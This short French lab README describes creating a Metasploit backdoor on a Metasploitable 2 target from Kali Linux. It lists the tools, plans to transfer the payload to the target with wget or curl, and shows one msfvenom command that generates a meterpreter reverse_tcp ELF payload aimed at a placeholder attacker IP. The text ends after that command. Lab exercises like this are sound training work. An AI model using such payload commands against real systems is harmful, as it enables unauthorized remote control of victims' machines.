# Sujet-3
 Créer un backdoor sur une cible et s’y connecter depuis une machine attaquante

Ce projet démontre la création et l'utilisation d'un **backdoor** pour obtenir un accès distant à une machine cible vulnérable, à l’aide de **Kali Linux** et **Metasploit**.

---

## 🧰 Environnement utilisé

- 🎯 **Machine cible** : Metasploitable 2 (Linux)
- 💻 **Machine attaquante** : Kali Linux
- 🔧 **Outils** :
  - `msfvenom`
  - `msfconsole`
  - `python3 -m http.server` (ou autre méthode de transfert)
  - `wget` ou `curl` sur la machine cible

---

## 📌 Étapes

### 1️⃣ Générer le backdoor avec `msfvenom`

Sur Kali Linux :

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f elf > backdoor.elf
